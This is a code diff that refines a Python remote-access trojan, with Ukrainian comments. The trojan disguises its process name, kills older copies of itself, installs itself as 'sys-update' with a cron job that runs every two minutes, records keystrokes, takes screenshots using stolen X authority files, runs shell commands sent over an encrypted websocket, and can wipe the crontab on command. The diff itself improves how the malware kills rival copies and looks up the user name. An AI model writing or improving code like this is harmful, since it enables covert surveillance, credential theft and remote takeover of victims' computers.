@@ -10,6 +10,7 @@ import glob
 import io
 import socket
 import signal
+import getpass
 from io import BytesIO
 
 try: import setproctitle
@@ -44,6 +45,7 @@ def encrypt(m):
     return base64.b64encode(crypt_logic(m).encode()).decode()
 
 def masquerade():
+    """Зміна імені процесу для маскування під системний воркер"""
     if setproctitle: 
         setproctitle.setproctitle(FAKE_NAME)
     else:
@@ -54,25 +56,22 @@ def masquerade():
         except: pass
 
 def kill_others():
-    """Агресивне очищення системи від конкурентів та старих версій"""
+    """Хірургічне видалення старих копій, уникаючи вбивства власної сесії"""
     my_pid = os.getpid()
+    parent_pid = os.getppid() # Твій SSH/Bash сеанс
     try:
-        # Шукаємо всі процеси з таким іменем через системний виклик ps
-        p = subprocess.run(['pgrep', '-f', FAKE_NAME], capture_output=True, text=True)
-        for pid_str in p.stdout.split():
-            pid = int(pid_str)
-            if pid != my_pid:
-                os.kill(pid, signal.SIGKILL)
-    except:
-        # Альтернативний метод, якщо pgrep немає
-        try:
-            p = subprocess.run(['ps', '-A', '-o', 'pid,command'], capture_output=True, text=True)
-            for line in p.stdout.splitlines():
-                if FAKE_NAME in line:
-                    pid = int(line.split()[0])
-                    if pid != my_pid:
-                        os.kill(pid, signal.SIGKILL)
-        except: pass
+        # Шукаємо тільки процеси, які вже мають змінену назву
+        p = subprocess.run(['ps', '-eo', 'pid,comm'], capture_output=True, text=True)
+        for line in p.stdout.splitlines():
+            if FAKE_NAME in line or "client.py" in line:
+                parts = line.strip().split()
+                if not parts: continue
+                pid = int(parts[0])
+                # Вбиваємо ТІЛЬКИ якщо це не ми і не наш "батько"
+                if pid != my_pid and pid != parent_pid:
+                    try: os.kill(pid, signal.SIGKILL)
+                    except: pass
+    except: pass
 
 def ghost_install():
     try:
@@ -80,24 +79,20 @@ def ghost_install():
         os.makedirs(p, exist_ok=True)
         t = os.path.join(p, "sys-update")
         
-        # Оновлюємо бінарний файл, якщо він відрізняється
         if not os.path.exists(t) or os.path.getsize(sys.argv[0]) != os.path.getsize(t):
             shutil.copy2(sys.argv[0], t)
             os.chmod(t, 0o755)
         
-        # Перевіряємо cron. Якщо нашого завдання немає — додаємо.
         cron_job = f"*/2 * * * * {t} >/dev/null 2>&1"
-        check = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
-        if t not in check:
-            # Очищаємо старі записи і додаємо новий
-            new_cron = "\n".join([l for l in check.splitlines() if "sys-update" not in l])
-            subprocess.run(f'(echo "{new_cron}"; echo "{cron_job}") | crontab -', shell=True)
+        current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
+        if t not in current_cron:
+            clean_cron = "\n".join([l for l in current_cron.splitlines() if "sys-update" not in l])
+            subprocess.run(f'(echo "{clean_cron}"; echo "{cron_job}") | crontab -', shell=True)
     except: pass
 
 def take_screenshot_sync():
     if not ImageGrab: return None
     try:
-        # Налаштування дисплея для root/cron
         if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
         if os.getuid() == 0:
             for path in glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']:
@@ -112,29 +107,21 @@ def take_screenshot_sync():
     except: return None
 
 async def run_shell(cmd):
-    """Шелл, який дійсно працює в cron"""
     try:
-        # Встановлюємо повний PATH для cron-сесій
         env = os.environ.copy()
         env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
         
         proc = await asyncio.create_subprocess_shell(
-            cmd, 
-            stdout=asyncio.subprocess.PIPE, 
-            stderr=asyncio.subprocess.PIPE,
-            env=env
+            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env
         )
         o, e = await proc.communicate()
         res = o.decode() + e.decode()
         
-        # Замість os.getlogin() використовуємо безпечні методи
-        user = "root" if os.getuid() == 0 else "user"
+        user = getpass.getuser() # Безпечна заміна os.getlogin()
         cwd = os.getcwd()
-        header = f"{user}@{socket.gethostname()}:{cwd}$ "
-        
-        return f"{header}\n{res}" if res.strip() else f"{header}(команда виконана)"
+        return f"{user}@{socket.gethostname()}:{cwd}$ \n{res}"
     except Exception as ex:
-        return f"Shell Error: {str(ex)}"
+        return f"Error: {str(ex)}"
 
 async def keylog_sender(ws):
     global log_buffer
@@ -154,11 +141,11 @@ def on_press(key):
         else: log_buffer.append(f"[{key.name}]")
 
 async def start():
-    # 1. Знищуємо всіх конкурентів перед початком
+    # 1. Хірургічна чистка
     kill_others()
-    # 2. Маскуємось
+    # 2. Маскування
     masquerade()
-    # 3. Закріплюємось
+    # 3. Закріплення
     ghost_install()
     
     if keyboard:
@@ -167,7 +154,7 @@ async def start():
             listener.start()
         except: pass
 
-    # Статичний ID на основі заліза
+    # Статичний ID
     b_id = hex(uuid.getnode())[2:10]
     
     while True:
@@ -183,10 +170,8 @@ async def start():
                     
                     if cmd == "screenshot":
                         shot_b64 = await asyncio.to_thread(take_screenshot_sync)
-                        if shot_b64:
-                            await ws.send(encrypt(f"SCREENSHOT:{shot_b64}"))
-                        else:
-                            await ws.send(encrypt("SYS_MSG: Screenshot failed"))
+                        if shot_b64: await ws.send(encrypt(f"SCREENSHOT:{shot_b64}"))
+                        else: await ws.send(encrypt("SYS_MSG: Screenshot failed"))
                             
                     elif cmd == "self_destruct":
                         subprocess.run("crontab -r", shell=True)
